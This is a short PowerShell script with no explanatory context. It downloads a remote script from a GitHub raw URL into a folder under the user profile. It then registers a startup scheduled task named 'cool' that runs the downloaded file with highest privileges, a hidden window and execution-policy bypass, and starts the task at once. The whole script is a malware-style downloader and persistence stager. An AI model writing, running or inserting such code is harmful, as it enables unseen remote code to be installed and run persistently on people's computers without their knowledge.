$url = "https://raw.githubusercontent.com/Dannesch/test/main/code.ps1"
$directory = $Env:USERPROFILE + "\.cool\"
if (-not (Test-Path -Path $directory -PathType Container)){
    New-Item -Path $directory -ItemType Directory
}
$file = $directory + "cool.ps1"

$file_content = Invoke-WebRequest -Uri $url
$file_content | Add-Content -Path $file

$task = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-W Hidden -Exec Bypass %USERPROFILE%\.cool\cool.ps1'
$trigger = New-ScheduledTaskTrigger -AtStartup

Register-ScheduledTask -Trigger $trigger -Action $task -RunLevel Highest -TaskName "cool"

Start-ScheduledTask -TaskName "cool"
